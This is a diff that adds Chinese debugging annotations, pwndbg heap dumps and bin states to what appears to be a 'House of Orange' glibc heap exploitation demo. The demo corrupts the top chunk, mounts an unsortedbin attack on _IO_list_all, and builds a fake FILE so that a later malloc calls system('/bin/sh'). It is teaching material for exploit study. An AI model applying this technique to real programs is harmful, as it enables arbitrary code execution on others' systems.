@@ -70,8 +70,25 @@ int main()
        2) Top chunk's prev_inuse bit has to be set.
     */
 
+    /*
+        此时堆内存布局:
+        0x555555756000: 0x0000000000000000  0x0000000000000401
+        0x555555756010: 0x0000000000000000  0x0000000000000000 <- p1指针
+        ...
+        0x5555557563f0: 0x0000000000000000  0x0000000000000000
+        0x555555756400: 0x0000000000000000  0x0000000000020c01   <-- Top chunk
+    */
+
     top = (size_t *) ( (char *) p1 + 0x400 - 16);
     top[1] = 0xc01;
+    /*
+        此时堆内存布局:
+        0x555555756000: 0x0000000000000000  0x0000000000000401
+        0x555555756010: 0x0000000000000000  0x0000000000000000 <- p1指针
+        ...
+        0x5555557563f0: 0x0000000000000000  0x0000000000000000
+        0x555555756400: 0x0000000000000000  0x0000000000000c01   <-- Top chunk
+    */
 
     /* 
        Now we request a chunk of size larger than the size of the Top chunk.
@@ -117,7 +134,30 @@ int main()
 
     */
 
+    // 0x555555756000     0x555555777000 rw-p    21000 0      [heap]
     p2 = malloc(0x1000);
+    // 0x555555756000     0x555555799000 rw-p    43000 0      [heap]    # 扩展了0x22000字节作为new Top
+    /*
+        此时堆内存布局:
+        0x555555756000: 0x0000000000000000  0x0000000000000401
+        0x555555756010: 0x0000000000000000  0x0000000000000000 <- p1指针
+        ...
+        0x5555557563f0: 0x0000000000000000  0x0000000000000000
+        0x555555756400: 0x0000000000000000  0x0000000000000be1 <- top指针(old Top) 已放到unsortedbin中
+        0x555555756410: 0x00007ffff7dd3b58  0x00007ffff7dd3b58
+        ...
+        0x555555776ff0: 0x0000000000000000  0x0000000000000000
+        0x555555777000: 0x0000000000000000  0x0000000000001011
+        0x555555777010: 0x0000000000000000  0x0000000000000000 <- p2指针
+        ...
+        0x555555778000: 0x0000000000000000  0x0000000000000000
+        0x555555778010: 0x0000000000000000  0x0000000000020ff1 <- top_chunk
+        0x555555778020: 0x0000000000000000  0x0000000000000000
+
+        unsortedbin
+        all: 0x555555756400 —▸ 0x7ffff7dd3b58 (main_arena+88) ◂— 0x555555756400
+
+    */
     /*
       Note that the above chunk will be allocated in a different page
       that gets mmapped. It will be placed after the old heap's end
@@ -153,6 +193,14 @@ int main()
       currently point to the libc's main_arena.
     */
 
+    /*
+      pwndbg> x top[2]
+      0x7ffff7dd3b58 <main_arena+88>: 0x0000555555778010
+      pwndbg> print &_IO_list_all
+      $8 = (struct _IO_FILE_plus **) 0x7ffff7dd4500 <_IO_list_all>
+      pwndbg> print (char *)&_IO_list_all - top[2]
+      $9 = 0x9a8 <error: Cannot access memory at address 0x9a8>
+    */
     io_list_all = top[2] + 0x9a8;
 
     /*
@@ -170,7 +218,23 @@ int main()
       So, we should set chunk->bk to be _IO_list_all - 16
     */
  
+    /*
+      unsortedbin
+      all: 0x555555756400 —▸ 0x7ffff7dd3b58 (main_arena+88) ◂— 0x555555756400
+    */
     top[3] = io_list_all - 0x10;
+    /*
+        此时堆内存布局:
+        0x5555557563f0: 0x0000000000000000  0x0000000000000000
+        0x555555756400: 0x0000000000000000  0x0000000000000be1 <- top指针(old Top) 已放到unsortedbin中
+        0x555555756410: 0x00007ffff7dd3b58  0x00007ffff7dd44f0 <- _IO_list_all-0x10
+
+        unsortedbin
+        all [corrupted]
+        FD: 0x555555756400 —▸ 0x7ffff7dd3b58 (main_arena+88) ◂— 0x555555756400
+        BK: 0x555555756400 —▸ 0x7ffff7dd44f0 ◂— 0x0
+    */
+
 
     /*
       At the end, the system function will be invoked with the pointer to this file pointer.
@@ -210,6 +274,12 @@ int main()
     */
 
     top[1] = 0x61;
+    /*
+        此时堆内存布局:
+        0x5555557563f0: 0x0000000000000000  0x0000000000000000
+        0x555555756400: 0x0000000000000000  0x0000000000000061 <- top指针(old Top) 已放到unsortedbin中
+        0x555555756410: 0x00007ffff7dd3b58  0x00007ffff7dd44f0 <- _IO_list_all-0x10
+    */
 
     /*
       Now comes the part where we satisfy the constraints on the fake file pointer
@@ -293,12 +363,84 @@ _IO_str_finish (_IO_FILE *fp, int dummy)
     fp->_IO_buf_base = "/bin/sh";
     top[29] = (size_t)system_addr; // top+0xe8
 
-
+    /*
+        此时堆内存布局:
+        0x5555557563f0: 0x0000000000000000  0x0000000000000000
+        0x555555756400: 0x0000000000000000  0x0000000000000061 <- top指针(old Top) 已放到unsortedbin中
+        0x555555756410: 0x00007ffff7dd3b58  0x00007ffff7dd44f0 <- _IO_list_all-0x10
+        0x555555756420: 0x0000000000000002  0x0000000000000003 <- fp->_IO_write_base|fp->_IO_write_ptr
+        0x555555756430: 0x0000000000000000  0x0000555555554af4 <- top->_IO_buf_base
+        0x555555756440: 0x0000000000000000  0x0000000000000000
+        0x555555756450: 0x0000000000000000  0x0000000000000000
+        0x555555756460: 0x0000000000000000  0x0000000000000000
+        0x555555756470: 0x0000000000000000  0x0000000000000000
+        0x555555756480: 0x0000000000000000  0x0000000000000000
+        0x555555756490: 0x0000000000000000  0x0000000000000000
+        0x5555557564a0: 0x0000000000000000  0x0000000000000000
+        0x5555557564b0: 0x0000000000000000  0x0000000000000000
+        0x5555557564c0: 0x0000000000000000  0x0000000000000000
+        0x5555557564d0: 0x0000000000000000  0x00007ffff7dd04f8 <- vtable
+        0x5555557564e0: 0x0000000000000000  0x00007ffff7a79480 <- top[29]
+        0x5555557564f0: 0x0000000000000000  0x0000000000000000
+        0x555555756500: 0x0000000000000000  0x0000000000000000
+        0x555555756510: 0x0000000000000000  0x0000000000000000
+        0x555555756520: 0x0000000000000000  0x0000000000000000
+        0x555555756530: 0x0000000000000000  0x0000000000000000
+    */
 
 
 
     /* Finally, trigger the whole chain by calling malloc */
-    malloc(10);
+    /*
+        pwndbg> x/4xg 0x00007ffff7dd44f0
+        0x7ffff7dd44f0: 0x0000000000000000  0x0000000000000000
+        0x7ffff7dd4500 <_IO_list_all>:  0x00007ffff7dd4520  0x0000000000000000
+
+        unsortedbin
+        all [corrupted]
+        FD: 0x555555756400 —▸ 0x7ffff7dd3b58 (main_arena+88) ◂— 0x555555756400
+        BK: 0x555555756400 —▸ 0x7ffff7dd44f0 ◂— 0x0
+            (victim)
+    */
+    malloc(10); // 将victim从unsortedbin中拿出来(设置(victim->bk)->fd = &unsortedbin),并放入smallbins[0x60]中
+    /*
+        此时堆内存布局:
+        0x5555557563f0: 0x0000000000000000  0x0000000000000000
+        0x555555756400: 0x0000000000000000  0x0000000000000061 <- top指针(old Top) 已放到unsortedbin中
+        0x555555756410: 0x00007ffff7dd3ba8  0x00007ffff7dd3ba8
+
+        pwndbg> x/4xg 0x00007ffff7dd44f0
+        0x7ffff7dd44f0: 0x0000000000000000  0x0000000000000000
+        0x7ffff7dd4500 <_IO_list_all>:  0x00007ffff7dd3b58  0x0000000000000000
+
+        unsortedbin
+        all [corrupted]
+        FD: 0x555555756400 —▸ 0x7ffff7dd3ba8 (main_arena+168) ◂— 0x555555756400
+        BK: 0x7ffff7dd44f0 ◂— 0x0
+        smallbins
+        0x60: 0x555555756400 —▸ 0x7ffff7dd3ba8 (main_arena+168) ◂— 0x555555756400
+    */
+
+    /*
+        _IO_flush_all_lockp 函数
+        {
+            fp = (_IO_FILE *) _IO_list_all;
+            while (fp != NULL) {
+                第一次循环不满足
+                fp = fp->_chain; 即 &unsortedbin + 0x68 = &smallbins[0x60]
+            }
+        }
+
+        pwndbg> x/40xg 0x7ffff7dd3b58
+        0x7ffff7dd3b58 <main_arena+88 >:    0x0000555555778010  0x0000000000000000 <- unsortedbin
+        0x7ffff7dd3b68 <main_arena+104>:    0x0000555555756400  0x00007ffff7dd44f0
+        0x7ffff7dd3b78 <main_arena+120>:    0x00007ffff7dd3b68  0x00007ffff7dd3b68
+        0x7ffff7dd3b88 <main_arena+136>:    0x00007ffff7dd3b78  0x00007ffff7dd3b78
+        0x7ffff7dd3b98 <main_arena+152>:    0x00007ffff7dd3b88  0x00007ffff7dd3b88
+        0x7ffff7dd3ba8 <main_arena+168>:    0x00007ffff7dd3b98  0x00007ffff7dd3b98
+        0x7ffff7dd3bb8 <main_arena+184>:    0x0000555555756400  0x0000555555756400 <- &smallbins[0x60]
+        0x7ffff7dd3bc8 <main_arena+200>:    0x00007ffff7dd3bb8  0x00007ffff7dd3bb8
+    */
 
    /*
      The libc's error message will be printed to the screen
